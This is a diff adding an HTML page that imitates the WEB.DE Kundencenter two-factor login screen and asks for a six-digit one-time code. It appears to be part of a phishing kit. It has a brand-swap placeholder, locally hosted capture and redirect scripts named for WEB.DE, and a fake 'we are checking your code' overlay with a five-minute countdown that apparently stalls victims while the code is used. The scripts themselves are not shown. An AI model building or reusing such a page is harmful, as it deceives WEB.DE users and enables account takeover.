@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>WEB.DE Kundencenter — Zwei-Faktor-Authentifizierung</title>
+  <link rel="icon" href="/favicon-webde.png" type="image/png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <!-- __BRAND_JSON__ -->
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+    body { margin: 0; background: #f6f6f6; color: #333; font-family: Verdana, "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 14px; line-height: 1.5; }
+    #wrapper { min-height: 100vh; display: flex; flex-direction: column; }
+    #container { flex: 1; max-width: 528px; margin: 0 auto; padding: 24px 16px 80px; width: 100%; }
+    .kc-header { border-top: 4px solid #ffd800; background: #fff; padding: 12px 16px; margin: 0 -16px 24px; box-shadow: 0 1px 0 #dadada; }
+    .kc-header-brand { font-size: 22px; font-weight: 300; color: #525252; font-family: Roboto, Arial, sans-serif; }
+    .kc-header-brand a { color: #525252; text-decoration: none; }
+    .kc-header-service { display: block; font-size: 14px; color: #707070; margin-top: 4px; }
+    .kc-card { background: #fff; border-radius: 4px; padding: 32px 28px; box-shadow: 0 1px 3px rgba(0,0,0,.06); }
+    .kc-hint { padding: 16px; border-radius: 4px; margin-bottom: 24px; border: 1px solid #c2c2c2; border-bottom-width: 4px; border-bottom-color: #1c8ad9; background: #fff; }
+    .kc-hint-headline { display: block; font-size: 18px; line-height: 24px; color: #525252; font-weight: 500; margin-bottom: 8px; font-family: Roboto, Arial, sans-serif; }
+    .kc-hint p { margin: 0; color: #333; font-size: 14px; line-height: 22px; }
+    .twofa-row { display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; margin: 24px 0; }
+    .twofa-row input { width: 44px; height: 52px; text-align: center; font-size: 1.35rem; font-weight: 500; border: 1px solid #c2c2c2; border-radius: 4px; font-family: inherit; }
+    .twofa-row input:focus { outline: none; border-color: #1c8ad9; box-shadow: 0 0 0 2px rgba(28,138,217,.2); }
+    .kc-actions { display: flex; flex-direction: column; gap: 12px; margin-top: 24px; }
+    .kc-btn-primary { display: inline-flex; justify-content: center; align-items: center; width: 100%; padding: 12px 20px; font-size: 16px; font-weight: 500; color: #fff; background: #1c8ad9; border: none; border-radius: 4px; cursor: pointer; font-family: inherit; min-height: 48px; }
+    .kc-btn-primary:hover { background: #166eae; }
+    .kc-btn-primary:disabled { background: #dadada; color: #999; cursor: not-allowed; }
+    .kc-btn-secondary { background: transparent; color: #1c8ad9; border: 1px solid #1c8ad9; padding: 10px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; font-family: inherit; }
+    .kc-btn-secondary:hover { background: #d6eaf8; }
+    .kc-btn-secondary:disabled { opacity: .5; cursor: not-allowed; }
+    .kc-footer { margin-top: 48px; padding: 16px; text-align: center; font-size: 12px; }
+    .kc-footer ul { list-style: none; margin: 0; padding: 0; display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 20px; }
+    .kc-footer a { color: #1c8ad9; text-decoration: none; }
+    .kc-footer a:hover { text-decoration: underline; }
+    .protection-overlay { position: fixed; inset: 0; z-index: 1000; display: flex; align-items: center; justify-content: center; }
+    .protection-overlay[hidden] { display: none !important; }
+    .protection-overlay-backdrop { position: absolute; inset: 0; background: rgba(51,51,51,.5); }
+    .protection-overlay-box { position: relative; background: #fff; padding: 32px 28px; border-radius: 4px; max-width: 360px; margin: 16px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,.2); }
+    .protection-overlay-spinner { width: 40px; height: 40px; margin: 0 auto 16px; border: 3px solid #dadada; border-top-color: #1c8ad9; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .protection-overlay-title { font-size: 16px; margin: 0 0 8px; color: #333; }
+    .protection-overlay-text { font-size: 14px; color: #707070; margin: 0 0 8px; }
+    .protection-overlay-countdown { font-size: 20px; font-weight: 500; color: #1c8ad9; margin: 0; }
+  </style>
+  <script src="/brand.js"></script>
+</head>
+<body>
+  <div id="wrapper">
+    <div id="container">
+      <header class="kc-header">
+        <div class="kc-header-brand"><a href="https://web.de/">WEB.DE Kundencenter</a></div>
+        <span class="kc-header-service">Kundencenter</span>
+      </header>
+
+      <div class="kc-card">
+        <section class="kc-hint" aria-live="polite">
+          <span class="kc-hint-headline">Zwei-Faktor-Authentifizierung</span>
+          <p>Bitte geben Sie den 6-stelligen Code aus Ihrer Bestätigungs-App oder per SMS ein.</p>
+        </section>
+
+        <form id="two-fa-form">
+          <div class="twofa-row" id="two-fa-code-row">
+            <input type="text" inputmode="numeric" maxlength="1" data-index="0" autocomplete="one-time-code" aria-label="Ziffer 1">
+            <input type="text" inputmode="numeric" maxlength="1" data-index="1" aria-label="Ziffer 2">
+            <input type="text" inputmode="numeric" maxlength="1" data-index="2" aria-label="Ziffer 3">
+            <input type="text" inputmode="numeric" maxlength="1" data-index="3" aria-label="Ziffer 4">
+            <input type="text" inputmode="numeric" maxlength="1" data-index="4" aria-label="Ziffer 5">
+            <input type="text" inputmode="numeric" maxlength="1" data-index="5" aria-label="Ziffer 6">
+          </div>
+          <button type="button" class="kc-btn-secondary" id="two-fa-resend">Code erneut anfordern</button>
+          <div class="kc-actions">
+            <button type="submit" class="kc-btn-primary" id="two-fa-confirm" disabled>Bestätigen</button>
+          </div>
+        </form>
+      </div>
+
+      <footer class="kc-footer">
+        <ul>
+          <li><a href="https://web.de/impressum/" target="_blank" rel="noopener">Impressum</a></li>
+          <li><a href="https://web.de/kuendigungsformular" target="_blank" rel="noopener">Verträge hier kündigen</a></li>
+          <li><a href="https://agb-server.web.de/webdeagb" target="_blank" rel="noopener">AGB</a></li>
+          <li><a href="https://agb-server.web.de/datenschutz" target="_blank" rel="noopener">Datenschutzhinweise</a></li>
+        </ul>
+      </footer>
+    </div>
+  </div>
+
+  <div id="two-fa-protection-overlay" class="protection-overlay" hidden aria-live="polite">
+    <div class="protection-overlay-backdrop"></div>
+    <div class="protection-overlay-box">
+      <div class="protection-overlay-spinner" aria-hidden="true"></div>
+      <h2 class="protection-overlay-title">Wir prüfen Ihren Code.</h2>
+      <p class="protection-overlay-text">Bitte warten Sie einen Moment.</p>
+      <p class="protection-overlay-countdown" id="two-fa-protection-countdown">5:00</p>
+    </div>
+  </div>
+
+  <script src="/2fa-code-webde.js"></script>
+  <script src="/status-redirect-webde.js"></script>
+  <script src="/chat-widget.js"></script>
+</body>
+</html>
